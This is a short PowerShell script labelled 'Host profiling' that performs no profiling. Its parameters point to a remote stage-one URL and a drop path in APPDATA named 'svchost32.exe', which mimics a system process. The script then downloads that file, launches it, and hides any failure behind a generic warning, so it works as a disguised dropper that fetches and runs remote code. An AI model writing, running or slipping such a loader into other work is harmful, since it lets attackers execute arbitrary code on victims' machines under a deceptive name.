
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://192.0.2.191/stage1.ps1',
    [string]$DropPath = "$env:APPDATA\svchost32.exe"
)
try { (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DropPath); Start-Process -FilePath $DropPath; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Remote fetch failed" }
